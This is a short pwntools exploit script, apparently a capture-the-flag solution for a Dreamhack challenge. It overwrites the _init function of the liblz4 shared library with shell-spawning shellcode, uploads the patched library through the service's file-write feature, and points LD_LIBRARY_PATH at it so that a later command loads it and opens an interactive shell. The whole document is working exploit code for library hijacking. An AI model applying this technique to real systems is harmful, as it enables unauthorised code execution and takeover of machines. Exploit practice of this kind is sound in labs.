from pwn import *
from base64 import b64encode
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('./release/public/main')
else:
    r = remote('host1.dreamhack.games', 15488)

sla = r.sendlineafter
sa = r.sendafter

def execute_cmd(cmd):
    sla('> ', '1')
    sla('i. id\n', cmd)

def set_env(name, value):
    sla('> ', '2')
    sla('> ', '2')
    r.sendline(name)
    r.sendline(value)

def create_tmpdir():
    sla('> ', '3')
    r.recvuntil('Your personal directory is: ')
    return r.recvline()[:-1]

def write_file(name, data):
    sla('> ', '4')
    sla('File name: ', name)
    sla('File data (base64 encoded): ', b64encode(data))


# modify liblz4.so.1.7.1

f = open('./liblz4.so.1.7.1', 'rb')
lib = f.read()
f.close()

shellcode = asm(shellcraft.sh())
offset = 0x1cf8  # offset of _init()

modified_lib = lib[:offset]
modified_lib += shellcode
modified_lib += lib[offset + len(shellcode):]


# get shell

tmpdir = create_tmpdir()
write_file('liblz4.so.1', modified_lib)
set_env('LD_LIBRARY_PATH', tmpdir)
execute_cmd('w')


r.interactive()